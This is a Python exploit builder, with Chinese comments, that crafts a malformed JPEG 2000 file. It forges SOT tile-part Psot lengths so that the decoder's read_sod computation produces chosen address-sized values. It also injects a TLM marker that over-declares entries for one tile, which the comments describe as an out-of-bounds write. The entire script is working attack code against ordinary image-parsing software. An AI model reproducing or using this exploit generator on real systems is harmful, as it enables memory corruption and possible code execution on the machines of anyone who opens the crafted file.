#!/usr/bin/env python3
# builder2.py —— 破墙版: 不靠物理填充, 用 SOT.Psot 声明值把"写出去的值"抬到任意高度
#   read_sod: end_pos = l_current_pos + m_sot_length + 2 ,  m_sot_length = Psot - 12
#   => v2(i) = sod_off(i) + Psot(i) - 10
#   => 只要 Psot 填得够大, 文件可以只有几百字节, 写入值仍能是 ~12MB 级地址
#   用法: builder2.py <base> <out> <tile> <N> <A> <B> <C>
import struct, sys

BASE, OUT = sys.argv[1], sys.argv[2]
TILE, N = int(sys.argv[3]), int(sys.argv[4])
A, B, C = int(sys.argv[5], 0), int(sys.argv[6], 0), int(sys.argv[7], 0)
if not (A < B < C):
    print('ORDER'); sys.exit(1)

d = bytearray(open(BASE, 'rb').read())
eoc = d.rfind(b'\xff\xd9')
soc = d.find(b'\xff\x4f'); si = d.find(b'\xff\x51', soc)
siz_end = si + 2 + struct.unpack('>H', d[si + 2:si + 4])[0]
ntiles = 4
tlm_entries = N + (ntiles - 1)
head = siz_end + (4 + 3 * tlm_entries)

nparts = N + 2                       # tpsno = 1 .. N+2
parts = [{'tpsno': 1 + k, 'psot': 14} for k in range(nparts)]
off = head
for p in parts:                      # SOT 12 字节 + SOD 2 字节 = 14
    p['sot_off'] = off
    p['sod_off'] = off + 12
    off += 14

targets = {N - 1: A, N: B, N + 1: C}       # k = tpsno-1
for k, v in targets.items():
    sod = parts[k]['sod_off']
    psot = v + 10 - sod
    if psot < 14:
        print('PSOT_NEG k=%d want=%#x sod=%#x psot=%d' % (k, v, sod, psot)); sys.exit(1)
    if psot > 0xFFFFFFFF:
        print('PSOT_TOO_BIG %d' % psot); sys.exit(1)
    parts[k]['psot'] = psot

extra = b''
for p in parts:
    extra += (b'\xff\x90' + struct.pack('>H', 10) + struct.pack('>H', TILE) +
              struct.pack('>I', p['psot']) + bytes([p['tpsno'], 0]) + b'\xff\x93')
buf = bytearray(bytes(d[:eoc]) + extra + bytes(d[eoc:]))

# 主头里塞 TLM: tile TILE 声明 N 条, 其它 tile 各 1 条 (数组永不增长 => 越界写)
ents = b''
for t in range(ntiles):
    cnt = N if t == TILE else 1
    for _ in range(cnt):
        ents += bytes([t]) + struct.pack('>H', 1)
TLM = b'\xff\x55' + struct.pack('>H', 4 + len(ents)) + bytes([0, 0x10]) + ents
buf = bytearray(bytes(buf[:siz_end]) + TLM + bytes(buf[siz_end:]))

# base 里原有 part 的 TPsot 全置 0, 避免和我们的序号冲突
i = siz_end + len(TLM)
while i < len(buf) - 12:
    if buf[i] == 0xFF and buf[i + 1] == 0x90:
        L = struct.unpack('>H', buf[i + 2:i + 4])[0]
        buf[i + 11] = 0
        i += 2 + L
    else:
        i += 1

open(OUT, 'wb').write(bytes(buf))
print('OK len=%d parts=%d psots=%s' % (len(buf), nparts, [hex(p['psot']) for p in parts[:4]] + ['...']))